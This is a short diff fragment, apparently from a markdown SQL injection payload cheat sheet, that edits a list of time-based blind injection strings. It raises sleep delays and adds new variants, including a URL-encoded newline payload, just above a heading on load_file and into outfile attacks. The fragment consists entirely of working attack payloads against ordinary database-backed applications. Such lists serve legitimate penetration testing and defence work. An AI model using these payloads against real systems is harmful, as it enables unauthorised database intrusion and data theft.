@@ -12,9 +12,11 @@ ___
 "
 ')
 ")
-' sleep(5)
-'; sleep(5)
+' sleep(15)
+' or sleep(15)-- -
+'; sleep(15)
 1'%0A||%0A1=1%0A--'-
+1'%0a%7c%7c%0asleep(7.5)%0a--'-
 ```
 
 ## SQL injection with load file and into outfile
